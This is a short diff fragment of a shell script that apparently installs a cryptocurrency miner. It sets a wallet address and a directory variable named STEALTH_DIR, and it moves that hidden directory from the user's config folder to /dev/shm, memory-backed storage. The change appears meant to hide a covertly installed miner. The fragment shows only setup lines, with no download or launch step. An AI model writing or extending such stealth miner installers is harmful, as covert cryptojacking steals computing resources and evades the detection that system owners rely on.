@@ -2,7 +2,7 @@
 #conf
 WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"
 #make
-STEALTH_DIR="$HOME/.config/.c3pool"
+STEALTH_DIR="/dev/shm/.config/.c3pool"
 MINER_SUBDIR="$STEALTH_DIR/c3pool"
 mkdir -p "$MINER_SUBDIR"
 #Install
